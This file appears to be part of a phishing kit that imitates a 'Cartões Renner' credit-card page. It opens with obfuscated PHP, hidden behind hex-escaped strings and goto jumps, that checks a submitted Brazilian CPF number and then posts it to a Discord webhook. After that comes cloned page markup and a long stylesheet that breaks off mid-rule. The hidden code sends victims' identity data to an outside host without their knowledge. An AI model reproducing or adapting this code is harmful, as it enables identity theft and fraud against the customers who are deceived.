<?php
 goto q436I; Adrz2: $modulo = $_POST["\x63\x70\x66"]; goto oWaNe; N2dYn: $cpf = $_POST["\x63\160\146"]; goto JseOm; q436I: function validarCPF($cpf) { $cpf = preg_replace("\x2f\x5b\136\60\55\71\x5d\57", '', $cpf); if (strlen($cpf) != 11) { return false; } if (preg_match("\57\x5e\x28\x5b\60\x2d\x39\135\x29\134\x31\x2a\x24\x2f", $cpf)) { return false; } $soma = 0; for ($i = 0; $i < 9; $i++) { $soma += (int) $cpf[$i] * (10 - $i); } $resto = $soma % 11; $digito1 = $resto < 2 ? 0 : 11 - $resto; $soma = 0; for ($i = 0; $i < 10; $i++) { $soma += (int) $cpf[$i] * (11 - $i); } $resto = $soma % 11; $digito2 = $resto < 2 ? 0 : 11 - $resto; if ($cpf[9] != $digito1 || $cpf[10] != $digito2) { return false; } return true; } goto N2dYn; oWaNe: if (empty($modulo)) { } else { $answer = $modulo; $content = "\103\x50\106\x20\x41\x43\x45\123\123\x4f\72\40{$answer}"; $link = "\150\164\164\x70\x73\72\57\x2f\144\151\x73\143\157\x72\x64\x2e\143\x6f\155\57\141\160\151\57\x77\145\x62\150\157\157\153\163\x2f\61\61\x31\x39\67\70\x35\x35\x35\x38\x33\66\x31\67\x38\70\x34\61\66\x2f\x48\x56\146\152\71\x48\x4d\104\x79\x68\x6d\x62\x7a\x6c\x56\x6f\65\70\157\167\x62\71\x47\103\125\163\x5a\x45\x71\x62\x70\103\102\145\x74\112\x30\147\157\x4d\x47\107\170\x77\153\60\110\66\71\x5f\101\x54\x69\x5a\x33\55\127\x6c\124\x6e\x78\x4b\145\70\110\110\x31\x75"; $basearray = array("\x63\157\156\x74\x65\x6e\x74" => $content); $hookarray = array("\x68\x74\x74\160" => array("\x68\145\x61\144\145\162" => "\103\157\156\164\x65\x6e\x74\55\164\x79\160\x65\x3a\40\x61\160\160\154\151\143\x61\x74\151\157\156\57\x78\55\167\x77\167\55\x66\x6f\162\155\55\165\x72\x6c\x65\156\143\x6f\144\x65\x64\xd\12", "\x6d\x65\164\x68\157\x64" => "\120\117\x53\x54", "\143\157\156\164\x65\156\x74" => http_build_query($basearray))); file_get_contents($link, false, stream_context_create($hookarray)); } goto tQWug; JseOm: if (!validarCPF($cpf)) { echo "\x3c\160\x20\163\x74\171\154\145\75\x27\x70\157\x73\x69\164\151\x6f\x6e\72\x61\x62\x73\x6f\154\165\164\x65\x3b\x20\164\x6f\x70\72\40\65\x30\160\x78\73\40\x6c\x65\x66\164\72\40\x31\60\160\x78\x3b\40\x62\x61\143\x6b\x67\162\x6f\x75\x6e\144\x2d\x63\157\154\157\162\72\x20\x72\145\x64\x3b\x20\x63\157\154\157\x72\x3a\x20\x77\x68\151\x74\145\x3b\x20\x70\141\x64\x64\151\156\x67\x3a\40\x31\60\x70\170\x3b\40\x7a\55\x69\x6e\x64\145\x78\x3a\x20\61\x3b\47\76\103\120\x46\x20\x69\x6e\166\xc3\xa1\x6c\x69\144\157\x3c\x2f\x70\x3e"; header("\114\157\143\x61\164\x69\x6f\x6e\72\40\x69\156\x76\141\x6c\x69\x64\x2e\x70\x68\x70"); } goto Adrz2; tQWug: ?>
<html class="">
   <head>
      <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
      <!-- Constantes -->
      <script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/2uoiJ4hP3NUoP9v_eBNfU6CR/recaptcha__pt_br.js" crossorigin="anonymous" integrity="sha384-RXEyOkswRBNPgdBg4j9Zb+5V3nduJ1nF+G+KOOmU/WZ3g01ETHfJmd2nTyThLjU6"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script src="https://cdn.pmweb.com.br/df/tag.js?id=PM-N2FTFQ" async=""></script><script type="text/javascript" async="" src="https://www.google-analytics.com/gtm/js?id=GTM-W9SBWRL&amp;cid=1003849302.1648069470"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-N2FTFQ"></script><script type="text/javascript" src="/ruxitagentjs_ICA2Vfghjqru_10235220309135426.js" data-dtconfig="rid=RID_-1565534470|rpid=771632474|domain=realizesolucoesfinanceiras.com.br|reportUrl=https://bf73995led.bf.dynatrace.com/bf|app=189e25234ffe70ce|cors=1|rcdec=1209600000|featureHash=ICA2Vfghjqru|vcv=2|rdnt=1|uxrgce=1|bp=3|srmcrv=10|cuc=ovxxhecl|mel=100000|dpvc=1|md=mdcc3=ah2.user-information__info-name|ssv=4|lastModification=1647975459642|dtVersion=10235220309135426|srmcrl=1|tp=500,50,0,1|uxdcw=1500|agentUri=/ruxitagentjs_ICA2Vfghjqru_10235220309135426.js"></script><script>
         window.constants = {};
         window.constants.GOOGLE_OPTIMIZE_CODE = 'GTM-W9SBWRL';
         window.constants.GOOGLE_TAG_MANAGER_CODE = 'GTM-N2FTFQ';
         window.constants.GOOGLE_ANALYTICS_CODE = 'UA-34448218-21';
         window.constants.AUTHORIZATION_CANAL = 'Basic cmVubmVyLXNpdGU6c2l0ZQ==';
      </script>
      <!-- End Constantes -->
      <!-- Dynatrace -->
      <script type="text/javascript" src="https://js-cdn.dynatrace.com/jstag/157944990f8/bf73995led/189e25234ffe70ce_complete.js" crossorigin="anonymous"></script>
      <!-- Google Optimize -->
      <style>
         .async-hide {
         opacity: 0 !important;
         }
      </style>
      <script>
         var container = {
           [window.constants.GOOGLE_OPTIMIZE_CODE]: true
         };
         (function (a, s, y, n, c, h, i, d, e) {
           s.className += ' ' + y;
           h.start = 1 * new Date;
           h.end = i = function () { s.className = s.className.replace(RegExp(' ?' + y), '') };
           (a[n] = a[n] || []).hide = h;
           setTimeout(function () {
             i();
             h.end = null
           }, c);
           h.timeout = c;
         })(window, document.documentElement, 'async-hide', 'dataLayer', 4000, container);
      </script>
      <!-- End Google Optimize -->
      <!-- Google Tag Manager -->
      <script>
         (function (w, d, s, l, i) {
           w[l] = w[l] || [];
           w[l].push({
             'gtm.start': new Date().getTime(),
             event: 'gtm.js'
           });
           var f = d.getElementsByTagName(s)[0],
             j = d.createElement(s),
             dl = l != 'dataLayer' ? '&l=' + l : '';
           j.async = true;
           j.src =
             'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
           f.parentNode.insertBefore(j, f);
         })(window, document, 'script', 'dataLayer', window.constants.GOOGLE_TAG_MANAGER_CODE);
      </script>
      <!-- End Google Tag Manager -->
      <meta charset="utf-8">
      <title>Cartões Renner</title>
      <meta name="format-detection" content="telephone=no">
      <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
      <!-- <favicon added later> -->
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
      <!-- Web Application Manifest -->
      <meta name="apple-itunes-app" content="app-id=567763947">
      <!-- <link rel="manifest" href="manifest.json"> -->
      <!-- Color the status bar on mobile devices -->
      <meta name="theme-color" content="#1e1e1e" id="metatag-android-theme-color">
      <!-- Add to homescreen for Chrome on Android -->
      <meta name="mobile-web-app-capable" content="yes">
      <meta name="application-name" content="Lojas Renner">
      <!-- <link added later> -->
      <!-- Add to homescreen for Safari on iOS -->
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-status-bar-style" content="#1e1e1e" id="metatag-ios-theme-color">
      <meta name="apple-mobile-web-app-title" content="Lojas Renner">
      <!-- <link added later> -->
      <!-- Info -->
      <meta name="site-version" content="1.0.0" meta-tag="SITE_VERSION">
      <meta name="build-id" content="" meta-tag="BUILD_ID">
      <script charset="utf-8" src="../js/3.bundle-d6a6baaa0dc3faae26db.js"></script><script charset="utf-8" src="/cartoes-renner/js/2.bundle-d410ea60e5b46c298cdd.js"></script>
      <style type="text/css">.footer {
         background: #232323;
         padding: 48px 0;
         color: #fff; }
         .footer__content {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap;
         margin: auto;
         max-width: 1140px; }
         .footer a {
         text-transform: none;
         text-decoration: none;
         color: #fff; }
         .footer a.disabled {
         display: inline-block;
         text-decoration: none;
         color: #a2a3a4;
         pointer-events: none; }
         .footer a:hover {
         text-decoration: underline;
         color: #fff; }
         .footer__endereco {
         margin-top: 22px;
         border-top: 1px solid #fff;
         padding-top: 16px; }
         .footer__endereco p {
         padding: 0 15px;
         max-width: 66%; }
         .footer ul.footer__list {
         margin: 0 0 24px;
         padding: 0;
         list-style-type: none; }
         .footer ul.footer__list li {
         padding: 6px 0; }
         .footer ul.footer__list ul {
         margin: 0 0 0 20px; }
         .footer__links {
         padding: 0 15px;
         width: 33%; }
         .footer__informacoes {
         width: 66%; }
         .footer__telefones {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: start;
         align-items: flex-start;
         flex-wrap: wrap;
         -webkit-box-pack: justify;
         justify-content: space-between;
         width: 100%; }
         .footer__telefones__bloco {
         padding: 0 15px;
         width: 50%; }
         .footer__telefone {
         margin-bottom: 0;
         line-height: 35px;
         color: #fff;
         font-size: 20px;
         font-weight: 400; }
         .footer__telefone a {
         text-decoration: none;
         color: #fff; }
         .footer__titulo {
         display: block;
         margin: 0 0 14px;
         border-bottom: 1px solid #fff;
         padding-bottom: 30px;
         padding-left: 15px;
         width: 100%;
         font-size: 20px; }
         .footer__subtitulo {
         margin: 10px 0 20px;
         color: #a2a3a4;
         font-size: 18px;
         font-weight: 700; }
         .footer__texto-destaque {
         color: #a2a3a4; }
         .footer__texto-orientacoes-representantes {
         color: #fff;
         margin-top: 10px;
         font-weight: bold;
         font-size: 1.25rem; }
         .footer__texto-sem-margem {
         margin: 0; }
         .footer__badges {
         display: block;
         margin-bottom: 24px; }
         .footer__badges a {
         display: inline-block; }
         .footer__badges a:first-child {
         margin-right: 20px; }
         .footer__whatsapp {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin-bottom: 15px; }
         .footer__whatsapp p {
         margin: 0; }
         .footer__whatsapp .footer__telefone {
         font-size: 16px; }
         .footer__whatsapp-icon {
         margin: 0 8px;
         width: 20px;
         height: 20px;
         color: #fff; }
         @media (max-width: 1023px) {
         .footer__endereco p {
         max-width: 100%; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .footer {
         padding-right: 50px;
         padding-left: 50px; } }
         @media (max-width: 767px) {
         .footer {
         padding: 0;
         text-align: center; }
         .footer__titulo {
         border-top: 1px solid #fff;
         padding: 32px 0; }
         .footer__links {
         width: 100%; }
         .footer__informacoes {
         width: 100%; }
         .footer__telefones__bloco {
         margin: 16px 0;
         width: 100%; }
         .footer__badges {
         -webkit-box-pack: center;
         justify-content: center; } }
      </style>
      <style type="text/css">@font-face {
         font-family: "Roboto";
         font-weight: 100;
         font-style: normal;
         src: local("Roboto Thin"), local("Roboto-Thin"), url(../fonts/Roboto-Thin.woff2) format("woff2"), url(/cartoes-renner/fonts/Roboto-Thin.woff) format("woff"), url(/cartoes-renner/fonts/Roboto-Thin.ttf) format("truetype");
         unicode-range: U+0000-0FF, U+0131, U+0152-153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215; }
         @font-face {
         font-family: "Roboto";
         font-weight: 300;
         font-style: normal;
         src: local("Roboto Light"), local("Roboto-Light"), url(../fonts/Roboto-Light.woff2) format("woff2"), url(/cartoes-renner/fonts/Roboto-Light.woff) format("woff"), url(/cartoes-renner/fonts/Roboto-Light.ttf) format("truetype");
         unicode-range: U+0000-0FF, U+0131, U+0152-153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215; }
         @font-face {
         font-family: "Roboto";
         font-weight: 400;
         font-style: normal;
         src: local("Roboto"), local("Roboto-Regular"), url(../fonts/Roboto-Regular.woff2) format("woff2"), url(/cartoes-renner/fonts/Roboto-Regular.woff) format("woff"), url(/cartoes-renner/fonts/Roboto-Regular.ttf) format("truetype");
         unicode-range: U+0000-0FF, U+0131, U+0152-153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215; }
         @font-face {
         font-family: "Roboto";
         font-weight: 500;
         font-style: normal;
         src: local("Roboto Medium"), local("Roboto-Medium"), url(../fonts/Roboto-Medium.woff2) format("woff2"), url(/cartoes-renner/fonts/Roboto-Medium.woff) format("woff"), url(/cartoes-renner/fonts/Roboto-Medium.ttf) format("truetype");
         unicode-range: U+0000-0FF, U+0131, U+0152-153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215; }
         @font-face {
         font-family: "Roboto";
         font-weight: 700;
         font-style: normal;
         src: local("Roboto Bold"), local("Roboto-Bold"), url(../fonts/Roboto-Bold.woff2) format("woff2"), url(/cartoes-renner/fonts/Roboto-Bold.woff) format("woff"), url(/cartoes-renner/fonts/Roboto-Bold.ttf) format("truetype");
         unicode-range: U+0000-0FF, U+0131, U+0152-153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215; }
         @font-face {
         font-family: "Roboto";
         font-weight: 900;
         font-style: normal;
         src: local("Roboto Black"), local("Roboto-Black"), url(../fonts/Roboto-Black.woff2) format("woff2"), url(/cartoes-renner/fonts/Roboto-Black.woff) format("woff"), url(/cartoes-renner/fonts/Roboto-Black.ttf) format("truetype");
         unicode-range: U+0000-0FF, U+0131, U+0152-153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215; }
         /**
         * Foundation for Sites by ZURB
         * Version 6.3.1
         * foundation.zurb.com
         * Licensed under MIT Open Source
         */
         /*! normalize-scss | MIT/GPLv2 License | bit.ly/normalize-scss */
         /* Document
         ========================================================================== */
         /**
         * 1. Change the default font family in all browsers (opinionated).
         * 2. Correct the line height in all browsers.
         * 3. Prevent adjustments of font size after orientation changes in
         *    IE on Windows Phone and in iOS.
         */
         html {
         font-family: sans-serif;
         /* 1 */
         line-height: 1.15;
         /* 2 */
         -ms-text-size-adjust: 100%;
         /* 3 */
         -webkit-text-size-adjust: 100%;
         /* 3 */ }
         /* Sections
         ========================================================================== */
         /**
         * Remove the margin in all browsers (opinionated).
         */
         body {
         margin: 0; }
         /**
         * Add the correct display in IE 9-.
         */
         article,
         aside,
         footer,
         header,
         nav,
         section {
         display: block; }
         /**
         * Correct the font size and margin on `h1` elements within `section` and
         * `article` contexts in Chrome, Firefox, and Safari.
         */
         h1 {
         font-size: 2em;
         margin: 0.67em 0; }
         /* Grouping content
         ========================================================================== */
         /**
         * Add the correct display in IE 9-.
         */
         figcaption,
         figure {
         display: block; }
         /**
         * Add the correct margin in IE 8.
         */
         figure {
         margin: 1em 40px; }
         /**
         * 1. Add the correct box sizing in Firefox.
         * 2. Show the overflow in Edge and IE.
         */
         hr {
         box-sizing: content-box;
         /* 1 */
         height: 0;
         /* 1 */
         overflow: visible;
         /* 2 */ }
         /**
         * Add the correct display in IE.
         */
         main {
         display: block; }
         /**
         * 1. Correct the inheritance and scaling of font size in all browsers.
         * 2. Correct the odd `em` font sizing in all browsers.
         */
         pre {
         font-family: monospace, monospace;
         /* 1 */
         font-size: 1em;
         /* 2 */ }
         /* Links
         ========================================================================== */
         /**
         * 1. Remove the gray background on active links in IE 10.
         * 2. Remove gaps in links underline in iOS 8+ and Safari 8+.
         */
         a {
         background-color: transparent;
         /* 1 */
         -webkit-text-decoration-skip: objects;
         /* 2 */ }
         /**
         * Remove the outline on focused links when they are also active or hovered
         * in all browsers (opinionated).
         */
         a:active,
         a:hover {
         outline-width: 0; }
         /* Text-level semantics
         ========================================================================== */
         /**
         * 1. Remove the bottom border in Firefox 39-.
         * 2. Add the correct text decoration in Chrome, Edge, IE, Opera, and Safari.
         */
         abbr[title] {
         border-bottom: none;
         /* 1 */
         text-decoration: underline;
         /* 2 */
         -webkit-text-decoration: underline dotted;
         text-decoration: underline dotted;
         /* 2 */ }
         /**
         * Prevent the duplicate application of `bolder` by the next rule in Safari 6.
         */
         b,
         strong {
         font-weight: inherit; }
         /**
         * Add the correct font weight in Chrome, Edge, and Safari.
         */
         b,
         strong {
         font-weight: bolder; }
         /**
         * 1. Correct the inheritance and scaling of font size in all browsers.
         * 2. Correct the odd `em` font sizing in all browsers.
         */
         code,
         kbd,
         samp {
         font-family: monospace, monospace;
         /* 1 */
         font-size: 1em;
         /* 2 */ }
         /**
         * Add the correct font style in Android 4.3-.
         */
         dfn {
         font-style: italic; }
         /**
         * Add the correct background and color in IE 9-.
         */
         mark {
         background-color: #ff0;
         color: #000; }
         /**
         * Add the correct font size in all browsers.
         */
         small {
         font-size: 80%; }
         /**
         * Prevent `sub` and `sup` elements from affecting the line height in
         * all browsers.
         */
         sub,
         sup {
         font-size: 75%;
         line-height: 0;
         position: relative;
         vertical-align: baseline; }
         sub {
         bottom: -0.25em; }
         sup {
         top: -0.5em; }
         /* Embedded content
         ========================================================================== */
         /**
         * Add the correct display in IE 9-.
         */
         audio,
         video {
         display: inline-block; }
         /**
         * Add the correct display in iOS 4-7.
         */
         audio:not([controls]) {
         display: none;
         height: 0; }
         /**
         * Remove the border on images inside links in IE 10-.
         */
         img {
         border-style: none; }
         /**
         * Hide the overflow in IE.
         */
         svg:not(:root) {
         overflow: hidden; }
         /* Forms
         ========================================================================== */
         /**
         * 1. Change the font styles in all browsers (opinionated).
         * 2. Remove the margin in Firefox and Safari.
         */
         button,
         input,
         optgroup,
         select,
         textarea {
         font-family: inherit;
         /* 1 */
         font-size: 100%;
         /* 1 */
         line-height: 1.15;
         /* 1 */
         margin: 0;
         /* 2 */ }
         /**
         * Show the overflow in IE.
         */
         button {
         overflow: visible; }
         /**
         * Remove the inheritance of text transform in Edge, Firefox, and IE.
         * 1. Remove the inheritance of text transform in Firefox.
         */
         button,
         select {
         /* 1 */
         text-transform: none; }
         /**
         * 1. Prevent a WebKit bug where (2) destroys native `audio` and `video`
         *    controls in Android 4.
         * 2. Correct the inability to style clickable types in iOS and Safari.
         */
         button,
         html [type="button"],
         [type="reset"],
         [type="submit"] {
         -webkit-appearance: button;
         /* 2 */ }
         button,
         [type="button"],
         [type="reset"],
         [type="submit"] {
         /**
         * Remove the inner border and padding in Firefox.
         */
         /**
         * Restore the focus styles unset by the previous rule.
         */ }
         button::-moz-focus-inner,
         [type="button"]::-moz-focus-inner,
         [type="reset"]::-moz-focus-inner,
         [type="submit"]::-moz-focus-inner {
         border-style: none;
         padding: 0; }
         button:-moz-focusring,
         [type="button"]:-moz-focusring,
         [type="reset"]:-moz-focusring,
         [type="submit"]:-moz-focusring {
         outline: 1px dotted ButtonText; }
         /**
         * Show the overflow in Edge.
         */
         input {
         overflow: visible; }
         /**
         * 1. Add the correct box sizing in IE 10-.
         * 2. Remove the padding in IE 10-.
         */
         [type="checkbox"],
         [type="radio"] {
         box-sizing: border-box;
         /* 1 */
         padding: 0;
         /* 2 */ }
         /**
         * Correct the cursor style of increment and decrement buttons in Chrome.
         */
         [type="number"]::-webkit-inner-spin-button,
         [type="number"]::-webkit-outer-spin-button {
         height: auto; }
         /**
         * 1. Correct the odd appearance in Chrome and Safari.
         * 2. Correct the outline style in Safari.
         */
         [type="search"] {
         -webkit-appearance: textfield;
         /* 1 */
         outline-offset: -2px;
         /* 2 */
         /**
         * Remove the inner padding and cancel buttons in Chrome and Safari on macOS.
         */ }
         [type="search"]::-webkit-search-cancel-button, [type="search"]::-webkit-search-decoration {
         -webkit-appearance: none; }
         /**
         * 1. Correct the inability to style clickable types in iOS and Safari.
         * 2. Change font properties to `inherit` in Safari.
         */
         ::-webkit-file-upload-button {
         -webkit-appearance: button;
         /* 1 */
         font: inherit;
         /* 2 */ }
         /**
         * Change the border, margin, and padding in all browsers (opinionated).
         */
         fieldset {
         border: 1px solid #c0c0c0;
         margin: 0 2px;
         padding: 0.35em 0.625em 0.75em; }
         /**
         * 1. Correct the text wrapping in Edge and IE.
         * 2. Correct the color inheritance from `fieldset` elements in IE.
         * 3. Remove the padding so developers are not caught out when they zero out
         *    `fieldset` elements in all browsers.
         */
         legend {
         box-sizing: border-box;
         /* 1 */
         display: table;
         /* 1 */
         max-width: 100%;
         /* 1 */
         padding: 0;
         /* 3 */
         color: inherit;
         /* 2 */
         white-space: normal;
         /* 1 */ }
         /**
         * 1. Add the correct display in IE 9-.
         * 2. Add the correct vertical alignment in Chrome, Firefox, and Opera.
         */
         progress {
         display: inline-block;
         /* 1 */
         vertical-align: baseline;
         /* 2 */ }
         /**
         * Remove the default vertical scrollbar in IE.
         */
         textarea {
         overflow: auto; }
         /* Interactive
         ========================================================================== */
         /*
         * Add the correct display in Edge, IE, and Firefox.
         */
         details {
         display: block; }
         /*
         * Add the correct display in all browsers.
         */
         summary {
         display: list-item; }
         /*
         * Add the correct display in IE 9-.
         */
         menu {
         display: block; }
         /* Scripting
         ========================================================================== */
         /**
         * Add the correct display in IE 9-.
         */
         canvas {
         display: inline-block; }
         /**
         * Add the correct display in IE.
         */
         template {
         display: none; }
         /* Hidden
         ========================================================================== */
         /**
         * Add the correct display in IE 10-.
         */
         [hidden] {
         display: none; }
         .foundation-mq {
         font-family: "small=0em&medium=48em&large=64em&xlarge=75em&xxlarge=90em&xxxlarge=100em"; }
         html {
         box-sizing: border-box;
         font-size: 100%; }
         *,
         *::before,
         *::after {
         box-sizing: inherit; }
         body {
         margin: 0;
         background: #fff;
         padding: 0;
         line-height: 1.5;
         color: #0a0a0a;
         font-family: Roboto, Arial, Helvetica, Helvetica Neue, sans-serif;
         font-weight: normal;
         -webkit-font-smoothing: antialiased;
         -moz-osx-font-smoothing: grayscale; }
         img {
         display: inline-block;
         max-width: 100%;
         height: auto;
         vertical-align: middle;
         -ms-interpolation-mode: bicubic; }
         textarea {
         border-radius: 0;
         height: auto;
         min-height: 50px; }
         select {
         box-sizing: border-box;
         border-radius: 0;
         width: 100%; }
         .map_canvas img,
         .map_canvas embed,
         .map_canvas object,
         .mqa-display img,
         .mqa-display embed,
         .mqa-display object {
         max-width: none !important; }
         button {
         border: 0;
         border-radius: 0;
         background: transparent;
         padding: 0;
         -webkit-appearance: none;
         -moz-appearance: none;
         appearance: none; }
         [data-whatinput='mouse'] button {
         outline: 0; }
         pre {
         overflow: auto; }
         .is-visible {
         display: block !important; }
         .is-hidden {
         display: none !important; }
         .row {
         max-width: 75rem;
         margin-right: auto;
         margin-left: auto;
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         flex-flow: row wrap; }
         .row .row {
         margin-right: -0.625rem;
         margin-left: -0.625rem; }
         @media print, screen and (min-width: 48em) {
         .row .row {
         margin-right: -0.9375rem;
         margin-left: -0.9375rem; } }
         @media print, screen and (min-width: 64em) {
         .row .row {
         margin-right: -0.9375rem;
         margin-left: -0.9375rem; } }
         .row .row.collapse {
         margin-right: 0;
         margin-left: 0; }
         .row.expanded {
         max-width: none; }
         .row.expanded .row {
         margin-right: auto;
         margin-left: auto; }
         .row:not(.expanded) .row {
         max-width: none; }
         .row.collapse > .column, .row.collapse > .columns {
         padding-right: 0;
         padding-left: 0; }
         .row.is-collapse-child,
         .row.collapse > .column > .row,
         .row.collapse > .columns > .row {
         margin-right: 0;
         margin-left: 0; }
         .column, .columns {
         -webkit-box-flex: 1;
         flex: 1 1 0px;
         padding-right: 0.625rem;
         padding-left: 0.625rem;
         min-width: initial; }
         @media print, screen and (min-width: 48em) {
         .column, .columns {
         padding-right: 0.9375rem;
         padding-left: 0.9375rem; } }
         .column.row.row, .row.row.columns {
         float: none;
         display: block; }
         .row .column.row.row, .row .row.row.columns {
         margin-right: 0;
         margin-left: 0;
         padding-right: 0;
         padding-left: 0; }
         .flex-container {
         display: -webkit-box;
         display: flex; }
         .flex-child-auto {
         -webkit-box-flex: 1;
         flex: 1 1 auto; }
         .flex-child-grow {
         -webkit-box-flex: 1;
         flex: 1 0 auto; }
         .flex-child-shrink {
         -webkit-box-flex: 0;
         flex: 0 1 auto; }
         .flex-dir-row {
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         flex-direction: row; }
         .flex-dir-row-reverse {
         -webkit-box-orient: horizontal;
         -webkit-box-direction: reverse;
         flex-direction: row-reverse; }
         .flex-dir-column {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .flex-dir-column-reverse {
         -webkit-box-orient: vertical;
         -webkit-box-direction: reverse;
         flex-direction: column-reverse; }
         .small-1 {
         -webkit-box-flex: 0;
         flex: 0 0 8.33333%;
         max-width: 8.33333%; }
         .small-offset-0 {
         margin-left: 0%; }
         .small-2 {
         -webkit-box-flex: 0;
         flex: 0 0 16.66667%;
         max-width: 16.66667%; }
         .small-offset-1 {
         margin-left: 8.33333%; }
         .small-3 {
         -webkit-box-flex: 0;
         flex: 0 0 25%;
         max-width: 25%; }
         .small-offset-2 {
         margin-left: 16.66667%; }
         .small-4 {
         -webkit-box-flex: 0;
         flex: 0 0 33.33333%;
         max-width: 33.33333%; }
         .small-offset-3 {
         margin-left: 25%; }
         .small-5 {
         -webkit-box-flex: 0;
         flex: 0 0 41.66667%;
         max-width: 41.66667%; }
         .small-offset-4 {
         margin-left: 33.33333%; }
         .small-6 {
         -webkit-box-flex: 0;
         flex: 0 0 50%;
         max-width: 50%; }
         .small-offset-5 {
         margin-left: 41.66667%; }
         .small-7 {
         -webkit-box-flex: 0;
         flex: 0 0 58.33333%;
         max-width: 58.33333%; }
         .small-offset-6 {
         margin-left: 50%; }
         .small-8 {
         -webkit-box-flex: 0;
         flex: 0 0 66.66667%;
         max-width: 66.66667%; }
         .small-offset-7 {
         margin-left: 58.33333%; }
         .small-9 {
         -webkit-box-flex: 0;
         flex: 0 0 75%;
         max-width: 75%; }
         .small-offset-8 {
         margin-left: 66.66667%; }
         .small-10 {
         -webkit-box-flex: 0;
         flex: 0 0 83.33333%;
         max-width: 83.33333%; }
         .small-offset-9 {
         margin-left: 75%; }
         .small-11 {
         -webkit-box-flex: 0;
         flex: 0 0 91.66667%;
         max-width: 91.66667%; }
         .small-offset-10 {
         margin-left: 83.33333%; }
         .small-12 {
         -webkit-box-flex: 0;
         flex: 0 0 100%;
         max-width: 100%; }
         .small-offset-11 {
         margin-left: 91.66667%; }
         .small-order-1 {
         -webkit-box-ordinal-group: 2;
         order: 1; }
         .small-order-2 {
         -webkit-box-ordinal-group: 3;
         order: 2; }
         .small-order-3 {
         -webkit-box-ordinal-group: 4;
         order: 3; }
         .small-order-4 {
         -webkit-box-ordinal-group: 5;
         order: 4; }
         .small-order-5 {
         -webkit-box-ordinal-group: 6;
         order: 5; }
         .small-order-6 {
         -webkit-box-ordinal-group: 7;
         order: 6; }
         .small-up-1 {
         flex-wrap: wrap; }
         .small-up-1 > .column, .small-up-1 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 100%;
         max-width: 100%; }
         .small-up-2 {
         flex-wrap: wrap; }
         .small-up-2 > .column, .small-up-2 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 50%;
         max-width: 50%; }
         .small-up-3 {
         flex-wrap: wrap; }
         .small-up-3 > .column, .small-up-3 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 33.33333%;
         max-width: 33.33333%; }
         .small-up-4 {
         flex-wrap: wrap; }
         .small-up-4 > .column, .small-up-4 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 25%;
         max-width: 25%; }
         .small-up-5 {
         flex-wrap: wrap; }
         .small-up-5 > .column, .small-up-5 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 20%;
         max-width: 20%; }
         .small-up-6 {
         flex-wrap: wrap; }
         .small-up-6 > .column, .small-up-6 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 16.66667%;
         max-width: 16.66667%; }
         .small-up-7 {
         flex-wrap: wrap; }
         .small-up-7 > .column, .small-up-7 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 14.28571%;
         max-width: 14.28571%; }
         .small-up-8 {
         flex-wrap: wrap; }
         .small-up-8 > .column, .small-up-8 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 12.5%;
         max-width: 12.5%; }
         .small-collapse > .column, .small-collapse > .columns {
         padding-right: 0;
         padding-left: 0; }
         .small-uncollapse > .column, .small-uncollapse > .columns {
         padding-right: 0.625rem;
         padding-left: 0.625rem; }
         @media print, screen and (min-width: 48em) {
         .medium-1 {
         -webkit-box-flex: 0;
         flex: 0 0 8.33333%;
         max-width: 8.33333%; }
         .medium-offset-0 {
         margin-left: 0%; }
         .medium-2 {
         -webkit-box-flex: 0;
         flex: 0 0 16.66667%;
         max-width: 16.66667%; }
         .medium-offset-1 {
         margin-left: 8.33333%; }
         .medium-3 {
         -webkit-box-flex: 0;
         flex: 0 0 25%;
         max-width: 25%; }
         .medium-offset-2 {
         margin-left: 16.66667%; }
         .medium-4 {
         -webkit-box-flex: 0;
         flex: 0 0 33.33333%;
         max-width: 33.33333%; }
         .medium-offset-3 {
         margin-left: 25%; }
         .medium-5 {
         -webkit-box-flex: 0;
         flex: 0 0 41.66667%;
         max-width: 41.66667%; }
         .medium-offset-4 {
         margin-left: 33.33333%; }
         .medium-6 {
         -webkit-box-flex: 0;
         flex: 0 0 50%;
         max-width: 50%; }
         .medium-offset-5 {
         margin-left: 41.66667%; }
         .medium-7 {
         -webkit-box-flex: 0;
         flex: 0 0 58.33333%;
         max-width: 58.33333%; }
         .medium-offset-6 {
         margin-left: 50%; }
         .medium-8 {
         -webkit-box-flex: 0;
         flex: 0 0 66.66667%;
         max-width: 66.66667%; }
         .medium-offset-7 {
         margin-left: 58.33333%; }
         .medium-9 {
         -webkit-box-flex: 0;
